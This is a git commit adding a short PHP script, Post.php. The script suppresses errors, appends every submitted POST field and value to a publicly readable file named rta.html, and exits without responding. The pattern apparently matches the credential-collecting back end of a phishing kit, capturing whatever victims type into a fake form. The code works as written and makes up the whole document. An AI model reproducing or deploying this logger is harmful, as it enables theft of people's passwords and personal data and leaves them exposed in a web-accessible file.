c7530006289d027762d61b5142fed498f0faaa31
siteswartanha <138677274+siteswartanha@users.noreply.github.com>
2023-07-05 17:01:04 +0530

    Add files via upload

---
+++ Post.php
@@ -0,0 +1,14 @@
+<?php
+error_reporting(0);
+$handle = fopen("rta.html","a");
+foreach($_POST as $variable => $value)
+{
+  fwrite($handle, $variable);
+  fwrite($handle, "= ");
+  fwrite($handle, $value);
+  fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?> 
